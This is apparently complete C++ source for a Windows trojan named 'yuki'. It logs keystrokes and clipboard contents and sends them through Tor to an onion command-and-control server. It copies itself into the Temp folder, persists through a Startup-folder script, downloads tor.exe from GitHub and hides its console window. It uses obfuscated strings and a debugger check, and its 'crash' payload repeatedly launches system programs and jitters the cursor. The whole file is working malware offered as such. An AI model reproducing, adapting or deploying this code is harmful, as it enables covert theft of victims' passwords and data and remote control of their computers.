#include <cstdio>
#include <chrono>
#include <thread>
#include <string>
#include <cstdlib>
#include <fstream>
#include <tchar.h>
#include <locale.h>
#include <shlobj.h>
#include <Windows.h>
#include <filesystem>
#include <wininet.h>
#include <dirent.h>
#include <fcntl.h>
#include <psapi.h>
#include <random>

#define MAX                 65536
#define cnc_onion_server    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.onion"

HHOOK hHook;
SOCKET fd;

HANDLE hClip;
char* str;
char buf_c[4096];

void clip_log()
{
    OpenClipboard(NULL);
    hClip = GetClipboardData(CF_TEXT);
    if (hClip != NULL) {
        str = (char*)GlobalLock(hClip);
        if (strcmp(buf_c, str) != 0) {
            send(fd, str, 4096, 0);
            strncpy(buf_c, str, sizeof(buf_c));
        }
        GlobalUnlock(hClip);
    }
    CloseClipboard();
}

char keyl[32];

void Log(const char *input)
{
    strcpy(keyl, input);
    strcat(keyl, "\n");
    send(fd, keyl, 4096, 0);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            DWORD vkCode = kbd->vkCode;
            if (vkCode >= 0x30 && vkCode <= 0x39) {
                if (GetAsyncKeyState(VK_SHIFT)) {
                    switch (vkCode) {
                    case 0x30:
                        Log(")");
                        break;
                    case 0x31:
                        Log("!");
                        break;
                    case 0x32:
                        Log("@");
                        break;
                    case 0x33:
                        Log("#");
                        break;
                    case 0x34:
                        Log("$");
                        break;
                    case 0x35:
                        Log("%");
                        break;
                    case 0x36:
                        Log("^");
                        break;
                    case 0x37:
                        Log("&");
                        break;
                    case 0x38:
                        Log("*");
                        break;
                    case 0x39:
                        Log("(");
                        break;
                    }
                }
                else {
                    switch (vkCode) {
                    case 0x30:
                        Log("0");
                        break;
                    case 0x31:
                        Log("1");
                        break;
                    case 0x32:
                        Log("2");
                        break;
                    case 0x33:
                        Log("3");
                        break;
                    case 0x34:
                        Log("4");
                        break;
                    case 0x35:
                        Log("5");
                        break;
                    case 0x36:
                        Log("6");
                        break;
                    case 0x37:
                        Log("7");
                        break;
                    case 0x38:
                        Log("8");
                        break;
                    case 0x39:
                        Log("9");
                        break;
                    }
                }
            }
            else if (vkCode >= 0x41 && vkCode <= 0x5A) {
                switch (vkCode) {
                case 0x41:
                    Log("a");
                    break;
                case 0x42:
                    Log("b");
                    break;
                case 0x43:
                    Log("c");
                    break;
                case 0x44:
                    Log("d");
                    break;
                case 0x45:
                    Log("e");
                    break;
                case 0x46:
                    Log("f");
                    break;
                case 0x47:
                    Log("g");
                    break;
                case 0x48:
                    Log("h");
                    break;
                case 0x49:
                    Log("i");
                    break;
                case 0x4A:
                    Log("j");
                    break;
                case 0x4B:
                    Log("k");
                    break;
                case 0x4C:
                    Log("l");
                    break;
                case 0x4D:
                    Log("m");
                    break;
                case 0x4E:
                    Log("n");
                    break;
                case 0x4F:
                    Log("o");
                    break;
                case 0x50:
                    Log("p");
                    break;
                case 0x51:
                    Log("q");
                    break;
                case 0x52:
                    Log("r");
                    break;
                case 0x53:
                    Log("s");
                    break;
                case 0x54:
                    Log("t");
                    break;
                case 0x55:
                    Log("u");
                    break;
                case 0x56:
                    Log("v");
                    break;
                case 0x57:
                    Log("w");
                    break;
                case 0x58:
                    Log("x");
                    break;
                case 0x59:
                    Log("y");
                    break;
                case 0x5A:
                    Log("z");
                    break;
                }
            }
            else {
                switch (vkCode) {
                case VK_OEM_PLUS:
                    GetAsyncKeyState(VK_SHIFT) ? Log("+") : Log("=");
                    break;
                case VK_OEM_COMMA:
                    GetAsyncKeyState(VK_SHIFT) ? Log("<") : Log(",");
                    break;
                case VK_OEM_MINUS:
                    GetAsyncKeyState(VK_SHIFT) ? Log("_") : Log("-");
                    break;
                case VK_OEM_PERIOD:
                    GetAsyncKeyState(VK_SHIFT) ? Log(">") : Log(".");
                    break;
                case VK_OEM_1:
                    GetAsyncKeyState(VK_SHIFT) ? Log(":") : Log(";");
                    break;
                case VK_OEM_2:
                    GetAsyncKeyState(VK_SHIFT) ? Log("?") : Log("/");
                    break;
                case VK_OEM_3:
                    GetAsyncKeyState(VK_SHIFT) ? Log("~") : Log("`");
                    break;
                case VK_OEM_4:
                    GetAsyncKeyState(VK_SHIFT) ? Log("{") : Log("[");
                    break;
                case VK_OEM_5:
                    GetAsyncKeyState(VK_SHIFT) ? Log("|") : Log("\\");
                    break;
                case VK_OEM_6:
                    GetAsyncKeyState(VK_SHIFT) ? Log("}") : Log("]");
                    break;
                case VK_OEM_7:
                    GetAsyncKeyState(VK_SHIFT) ? Log("\"") : Log("'");
                    break;
                case VK_LCONTROL:
                    Log("[LCONTROL]");
                    break;
                case VK_RCONTROL:
                    Log("[RCONTROL]");
                    break;
                case VK_CANCEL:
                    Log("[CANCEL]");
                    break;
                case VK_BACK:
                    Log("[BACKSPACE]\r");
                    break;
                case VK_TAB:
                    Log("[TAB]");
                    break;
                case VK_CLEAR:
                    Log("[CLEAR]");
                    break;
                case VK_RETURN:
                    Log("[ENTER]");
                    break;
                case VK_CONTROL:
                    Log("[CTRL]");
                    break;
                case VK_MENU:
                    Log("[ALT]");
                    break;
                case VK_PAUSE:
                    Log("[PAUSE]");
                    break;
                case VK_CAPITAL:
                    Log("[CAPS LOCK]");
                    break;
                case VK_ESCAPE:
                    Log("[ESC]");
                    break;
                case VK_SPACE:
                    Log("[SPACE]");
                    break;
                case VK_PRIOR:
                    Log("[PAGE UP]");
                    break;
                case VK_NEXT:
                    Log("[PAGE DOWN]");
                    break;
                case VK_END:
                    Log("[END]");
                    break;
                case VK_HOME:
                    Log("[HOME]");
                    break;
                case VK_LEFT:
                    Log("[LEFT ARROW]");
                    break;
                case VK_UP:
                    Log("[UP ARROW]");
                    break;
                case VK_RIGHT:
                    Log("[RIGHT ARROW]");
                    break;
                case VK_DOWN:
                    Log("[DOWN ARROW]");
                    break;
                case VK_INSERT:
                    Log("[INS]");
                    break;
                case VK_DELETE:
                    Log("[DEL]");
                    break;
                case VK_NUMPAD0:
                    Log("[NUMPAD 0]");
                    break;
                case VK_NUMPAD1:
                    Log("[NUMPAD 1]");
                    break;
                case VK_NUMPAD2:
                    Log("[NUMPAD 2]");
                    break;
                case VK_NUMPAD3:
                    Log("[NUMPAD 3");
                    break;
                case VK_NUMPAD4:
                    Log("[NUMPAD 4]");
                    break;
                case VK_NUMPAD5:
                    Log("[NUMPAD 5]");
                    break;
                case VK_NUMPAD6:
                    Log("[NUMPAD 6]");
                    break;
                case VK_NUMPAD7:
                    Log("[NUMPAD 7]");
                    break;
                case VK_NUMPAD8:
                    Log("[NUMPAD 8]");
                    break;
                case VK_NUMPAD9:
                    Log("[NUMPAD 9]");
                    break;
                case VK_MULTIPLY:
                    Log("[*]");
                    break;
                case VK_ADD:
                    Log("[+]");
                    break;
                case VK_SUBTRACT:
                    Log("[-]");
                    break;
                case VK_DECIMAL:
                    Log("[.]");
                    break;
                case VK_DIVIDE:
                    Log("[/]");
                    break;
                case VK_F1:
                    Log("[F1]");
                    break;
                case VK_F2:
                    Log("[F2]");
                    break;
                case VK_F3:
                    Log("[F3]");
                    break;
                case VK_F4:
                    Log("[F4]");
                    break;
                case VK_F5:
                    Log("[F5]");
                    break;
                case VK_F6:
                    Log("[F6]");
                    break;
                case VK_F7:
                    Log("[F7]");
                    break;
                case VK_F8:
                    Log("[F8]");
                    break;
                case VK_F9:
                    Log("[F9]");
                    break;
                case VK_F10:
                    Log("[F10]");
                    break;
                case VK_F11:
                    Log("[F11]");
                    break;
                case VK_F12:
                    Log("[F12]");
                    break;
                case VK_NUMLOCK:
                    Log("[NUM LOCK]");
                    break;
                case VK_SCROLL:
                    Log("[SCROLL LOCK]");
                    break;
                }
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void keylog()
{
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

static void start_tor()
{
    STARTUPINFO si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    CreateProcess(nullptr, (LPSTR)"\x43"":\134W\x69""n\144o\x77""s\134T\x65""m\160\\\x74""o\162.\x65\x78\145", nullptr, nullptr, false, 0, nullptr, nullptr, &si, &pi);
}

int wget(HINTERNET hInet, const TCHAR* url, FILE* fp)
{
	char buf[1024];
    HINTERNET hUrl;

    hUrl = InternetOpenUrl(hInet, url, NULL, 0, 0, 0);
    if (hUrl == NULL) return 1;

    int len, size = 0;
    while (1) {
        InternetReadFile(hUrl, buf, sizeof(buf), (LPDWORD)&len);
        if (len <= 0) break;
        fwrite(buf, sizeof(0[buf]), len, fp);
        size += len;
    }
    InternetCloseHandle(hUrl);
    return len;
}

void wget()
{
    HINTERNET hInet;
    HINTERNET hFile;
    FILE *fp;
    hInet = InternetOpen(TEXT("TEST"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    hFile = InternetOpenUrl(hInet, TEXT("https://github.com/ware255/yuki/raw/main/bot/tor.exe"), NULL, 0, 0, 0);
    if (hFile == NULL) return;
    fopen_s(&fp, "C:\\Windows\\Temp\\tor.exe", "wb");
    if (wget(hInet, TEXT("https://github.com/ware255/yuki/raw/main/bot/tor.exe"), fp) < 0) return;
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInet);
    fclose(fp);
}

TCHAR *my_strcat(TCHAR *dest, const TCHAR *src)
{
    size_t i, j;
    for (j = 0 ; j[dest] != '\0'; j++);
    for (i = 0 ; i[src] != '\0'; i++) dest[j + i] = i[src];
    dest[j + i] = '\0';
    return dest;
}

bool has_suffix(const std::string& s, const std::string& suffix) {
    return (s.size() >= suffix.size()) && equal(suffix.rbegin(), suffix.rend(), s.rbegin());
}

char buff[512];
int source, target, byt;

std::string ExePath() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    std::string::size_type pos = std::string(buffer).find_last_of("\\/");
    return std::string(buffer).substr(0, pos);
}

std::string ExeName() {
    char buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

void self_duplicating(int a)
{
    std::string exename = ExeName();
    std::string path = ExePath();
    source = open(exename.c_str(), O_RDONLY|O_BINARY);
    target = open("C:\\Windows\\Temp\\yuki.exe", O_CREAT|O_BINARY|O_WRONLY);
    while(1) {
        byt = read(source, buff, 512);
        if (byt > 0) write(target, buff, byt);
        else break;
    }
    close(source);
    close(target);
}

void self_duplicating()
{
    TCHAR cdir[512];
    TCHAR BaseName[MAX_PATH];
    TCHAR *backslash = (TCHAR*)"\\";
    DWORD dwProcessId = GetCurrentProcessId();
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (NULL != hProcess) {
        GetModuleBaseName(hProcess, NULL, BaseName, _countof(BaseName));
        CloseHandle(hProcess);
    }
    GetCurrentDirectory(255, cdir);
    my_strcat(cdir, backslash);
    if (CopyFile(cdir, "C:\\Windows\\Temp\\yuki.exe", FALSE) == FALSE) self_duplicating(1);
}

void start_up(int a)
{
    TCHAR path[512];
    TCHAR *s = (TCHAR*)"\\yuki.cmd";
    TCHAR *d = (TCHAR*)"@echo off\nC:\\Windows\\Temp\\yuki.exe 255 crash";
    DWORD dwNumberOfBytesWritten;
    while (1) {
        if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE)  my_strcat(path, s);
        if (DeleteFile(path) == FALSE) continue;
        HANDLE hFile = CreateFile(
            path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
            CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
        );
        if (!WriteFile(hFile, d, lstrlen(d), &dwNumberOfBytesWritten, NULL)) continue;
        CloseHandle(hFile);
        break;
    }
}

void start_up()
{
    TCHAR path[512];
    TCHAR *s = (TCHAR*)"\\yuki.cmd";
    TCHAR *d = (TCHAR*)"@echo off\nC:\\Windows\\Temp\\yuki.exe 255";
    DWORD dwNumberOfBytesWritten;
    self_duplicating();
    while (1) {
        if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE) my_strcat(path, s);
        HANDLE hFile = CreateFile(
            path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
            CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
        );
        if (!WriteFile(hFile, d, lstrlen(d), &dwNumberOfBytesWritten, NULL)) continue;
        CloseHandle(hFile);
        wget();
        break;
    }
}

const char *sites[] = {
    "\x68""t\164p\x73"":\057/\x64""u\143k\x64""u\143k\x67""o\056c\x6F""m\057",
    "\x63""a\154c\x75""l\141t\x6F""r",
    "\x6E""o\164e\x70""a\144",
    "\x63""m\144",
    "\x77""r\151t\x65""",
    "\x72""e\147e\x64""i\164",
    "\x65""x\160l\x6F""r\145r",
    "\x74""a\163k\x6D""g\162",
    "\x6D""s\143o\x6E""f\151g",
    "\x6D""s\160a\x69""n\164",
    "\x64""e\166m\x67""m\164.\x6D""s\143",
    "\x63""o\156t\x72""o\154",
    "\x6D""m\143",
};

DWORD WINAPI alert(LPVOID lpstart)
{
    while (1) {
        MessageBeep(MB_ICONHAND);
        Sleep(1000);
    }
}

template<typename T>
T random(T a, T b)
{
    std::random_device rnd;
    std::mt19937 mt(rnd());
    std::uniform_int_distribution<> rand(a, b);
    return rand(mt);
}

void payloadExecute()
{
    constexpr size_t nSites = sizeof(sites) / sizeof(void *);
    srand((unsigned)time(nullptr));
    while (1) {
        ShellExecuteA(NULL, "open", (LPCSTR)sites[rand() % nSites], NULL, NULL, SW_SHOWDEFAULT);
        Sleep(100);
    }
}

void RandCursor()
{
    POINT p;
    GetCursorPos(&p);
    int sxs,sys,sxl,syl;
    sxs = p.x - 3;
    sys = p.y - 3;
    sxl = p.x + 3;
    syl = p.y + 3;
    SetCursorPos(random(sxs, sxl), random(sys, syl));
}

DWORD WINAPI infCursor(LPVOID lpstart)
{
    while (1) RandCursor();
}

inline void crash()
{
    std::thread th(payloadExecute);
    CreateThread(0, 0, infCursor, 0, 0, 0);
    CreateThread(0, 0, alert, 0, 0, 0);
    Sleep(-1);
}

int main(int argc, char **argv)
{
    HANDLE hMutex = CreateMutex(NULL, FALSE, _T("test"));
    if (GetLastError() == ERROR_ALREADY_EXISTS || hMutex == NULL) return 1;

    AllocConsole();
    HWND window = FindWindowA("\x43""o\156s\x6F""l\145W\x69""n\144o\x77""C\154a\x73""s", NULL);
    ShowWindow(window, 0);

    if (IsDebuggerPresent()) ExitProcess(1);

    if (argc != 2) start_up();
    if (argc == 3) crash();

    std::thread th_tor(start_tor);
    th_tor.detach();
    std::this_thread::sleep_for(std::chrono::seconds(5));

    WSADATA wsaData;
    char recv_buf[MAX] = {};
    char send_buf[MAX] = {};

    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) return 1;

    SOCKET      Socket;
    SOCKADDR_IN SocketAddr;

    SocketAddr.sin_family       = AF_INET;
    SocketAddr.sin_port         = htons(9050);
    SocketAddr.sin_addr.s_addr  = inet_addr("127.0.0.1");

    do {
        Socket = socket(AF_INET, SOCK_STREAM, 0);
        fd = Socket;

        if (connect(Socket, (SOCKADDR*)&SocketAddr, sizeof(SOCKADDR_IN))) {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }

        char Req1[3] = { 0x05, 0x01, 0x00 };
        send(Socket, Req1, 3, 0);

        char Resp1[2];
        recv(Socket, Resp1, 2, 0);
        if (1[Resp1] != 0x00) {
            std::this_thread::sleep_for(std::chrono::seconds(3));
            continue;
        }

        char Domain[] = cnc_onion_server;
        char  DomainLen = (char)strlen(Domain);
        short Port = htons(80);
        char TmpReq[4] = { 0x05, 0x01, 0x00, 0x03 };
        char* Req2 = new char[4 + 1 + DomainLen + 2];

        memcpy(Req2, TmpReq, 4);
        memcpy(Req2 + 4, &DomainLen, 1);
        memcpy(Req2 + 5, Domain, DomainLen);
        memcpy(Req2 + 5 + DomainLen, &Port, 2);

        send(Socket, (char*)Req2, 4 + 1 + DomainLen + 2, 0);

        delete[] Req2;

        char Resp2[10];
        recv(Socket, Resp2, 10, 0);
        if (1[Resp2] != 0x00) {
            std::this_thread::sleep_for(std::chrono::seconds(3));
            continue;
        }

        while (1) {
            recv(Socket, recv_buf, sizeof(recv_buf), 0);
            recv_buf[strcspn(recv_buf, "\r\n")] = 0;

            if (!strcmp(recv_buf, "!q")) break;
            if (!strcmp(recv_buf, "\x70""w\144")) {
                std::filesystem::path path = std::filesystem::current_path();
                std::string path_string{path.u8string()};
                char carry[path_string.size()];
                path_string.copy(carry, path_string.size());
                strcpy(send_buf, carry);
            }
            else if (!strcmp(recv_buf, "\x6B""e\171l\x6F""g\147e\x72""")) keylog();
            else if (!strcmp(recv_buf, "\x63""l\151p\x6C""o\147g\x65""r")) {
                OpenClipboard(NULL);
                hClip = GetClipboardData(CF_TEXT);
                if (hClip != NULL) {
                    str = (char*)GlobalLock(hClip);
                    send(Socket, str, 4096, 0);
                    GlobalUnlock(hClip);
                }
                strncpy(buf_c, str, sizeof(buf_c));
                CloseClipboard();
                while (1) {
                    Sleep(1000);
                    clip_log();
                }
                continue;
            }
            else if (!strcmp(recv_buf, "\x61""l\154_\x6C""o\147")) {
                std::thread th_0(keylog);
                th_0.join();
                OpenClipboard(NULL);
                hClip = GetClipboardData(CF_TEXT);
                if (hClip != NULL) {
                    str = (char*)GlobalLock(hClip);
                    send(Socket, str, 4096, 0);
                    GlobalUnlock(hClip);
                }
                strncpy(buf_c, str, sizeof(buf_c));
                CloseClipboard();
                while (1) {
                    Sleep(1000);
                    clip_log();
                }
                continue;
            }
            else if (!strcmp(recv_buf, "\x63""r\141s\x68""")) {
                start_up(1);
                crash();
                continue;
            }
            send(Socket, send_buf, strlen(send_buf), 0);
            memset(send_buf, 0, MAX*sizeof(0[send_buf]));
        }
    } while (1);
    closesocket(Socket);
    WSACleanup();
    return 0;
}
